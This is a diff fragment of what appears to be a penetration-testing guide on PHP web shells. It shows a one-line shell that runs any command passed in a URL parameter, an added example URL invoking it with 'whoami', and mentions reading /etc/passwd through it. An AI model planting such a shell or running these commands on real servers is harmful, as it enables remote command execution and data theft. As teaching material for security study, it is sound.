@@ -47,6 +47,10 @@ passthru\(\):
 <?php echo passthru($_GET['cmd']);?>
 ```
 
+From any of the functions above, we can request the following URL:
+
+* http://10.10.10.10/filename.php?cmd=whoami
+
 When executing certain commands such as `ps -faux`, or a simple `cat / etc / passwd`, you can see how the output shown via the web has an unpleasant aspect to read. We can fix this by adding some preformatting tags to our script:
 
 ```php
